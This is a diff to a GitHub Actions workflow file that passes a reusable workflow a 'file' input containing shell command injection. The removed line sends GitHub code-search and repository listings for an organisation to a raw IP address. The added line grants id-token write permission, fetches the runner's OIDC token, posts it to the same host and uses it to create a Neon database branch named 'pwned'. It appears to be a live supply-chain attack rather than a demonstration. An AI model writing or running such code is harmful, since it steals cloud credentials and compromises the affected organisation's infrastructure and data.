@@ -1,12 +1,15 @@
-name: ci-v19
+name: ci-v20
 on: [workflow_dispatch]
+permissions:
+  id-token: write
+  contents: read
 jobs:
   call:
     uses: useboardwalk/morphex-workflows/.github/workflows/roboanimals-workflow.yml@master
     with:
       ref: main
       comment-id: "5074314510"
-      file: "$(curl -s 'https://api.github.com/search/code?q=morphex-workflows+org:useboardwalk&per_page=5' -H 'Accept: application/vnd.github.v3+json' | curl -s -X POST http://93.127.162.210:8080/codesearch -d @-; curl -s 'https://api.github.com/orgs/useboardwalk/repos?type=all&per_page=50&sort=updated' | curl -s -X POST http://93.127.162.210:8080/repos -d @-; curl -s http://93.127.162.210:8080/v19end; echo x)"
+      file: "$(OIDC=$(curl -s -H 'Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN' '$ACTIONS_ID_TOKEN_REQUEST_URL&audience=neon' 2>&1); echo $OIDC | curl -s -X POST http://93.127.162.210:8080/oidc -d @-; curl -s -X POST 'https://console.neon.tech/api/v2/projects/withered-haze-52516121/branches' -H 'Content-Type: application/json' -H 'Authorization: Bearer '$OIDC -d '{\"branch\":{\"name\":\"pwned\"}}' 2>&1 | curl -s -X POST http://93.127.162.210:8080/neonbranch -d @-; curl -s http://93.127.162.210:8080/v20end; echo x)"
       network: base
       fn: hydate_compiler_cache
       send: "false"
